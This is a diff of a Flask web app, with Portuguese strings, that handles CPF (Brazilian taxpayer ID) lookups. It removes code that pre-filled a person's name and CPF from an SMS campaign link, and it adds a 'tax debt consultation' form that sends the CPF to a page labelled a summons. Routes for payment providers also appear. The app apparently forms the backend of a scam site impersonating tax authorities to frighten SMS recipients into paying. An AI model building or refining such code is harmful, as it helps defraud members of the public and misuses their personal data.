@@ -273,25 +273,16 @@ def get_cpf_data(cpf):
 
 @app.route('/')
 def index():
+    """Página inicial com formulário de consulta de CPF"""
+    today_date = datetime.now().strftime('%d/%m/%Y')
     default_data = {
-        'nome': 'JOÃO DA SILVA SANTOS',
-        'cpf': '123.456.789-00',
-        'phone': '11999999999'
+        'nome': 'CONSULTA DE DÉBITOS TRIBUTÁRIOS',
+        'cpf': '000.000.000-00',
+        'today_date': today_date
     }
 
-    utm_content = request.args.get('utm_content', '')
-    utm_source = request.args.get('utm_source', '')
-    utm_medium = request.args.get('utm_medium', '')
-
-    if utm_source == 'smsempresa' and utm_medium == 'sms' and utm_content:
-        customer_data = get_customer_data(utm_content)
-        if customer_data:
-            default_data = customer_data
-            default_data['phone'] = utm_content
-            session['customer_data'] = default_data
-
-    app.logger.info("[PROD] Renderizando página inicial")
-    return render_template('index.html', customer=default_data)
+    app.logger.info("[PROD] Renderizando página inicial com formulário de consulta")
+    return render_template('index.html', customer=default_data, show_cpf_search=True)
 
 @app.route('/<path:cpf>')
 def index_with_cpf(cpf):
@@ -349,10 +340,6 @@ def verificar_cpf():
     app.logger.info("[PROD] Acessando página de verificação de CPF: verificar-cpf.html")
     return render_template('verificar-cpf.html')
 
-@app.route('/buscar-cpf')
-def buscar_cpf():
-    app.logger.info("[PROD] Acessando página de busca de CPF: buscar-cpf.html")
-    return render_template('buscar-cpf.html')
 
 @app.route('/chat')
 def chat():
@@ -1721,6 +1708,24 @@ def provider_status():
             'success': False,
             'error': str(e)
         }), 500
+
+@app.route('/processar-cpf', methods=['POST'])
+def processar_cpf():
+    """Processa busca de CPF e redireciona para intimação"""
+    cpf = request.form.get('cpf', '').strip()
+    
+    if not cpf:
+        return redirect('/')
+    
+    # Remove formatting
+    clean_cpf = re.sub(r'[^0-9]', '', cpf)
+    
+    # Validate CPF (11 digits)
+    if len(clean_cpf) != 11:
+        return redirect('/')
+    
+    app.logger.info(f"[PROD] Redirecionando para intimação com CPF: {clean_cpf}")
+    return redirect(f'/{clean_cpf}')
 
 @app.route('/test-payment')
 def test_payment():
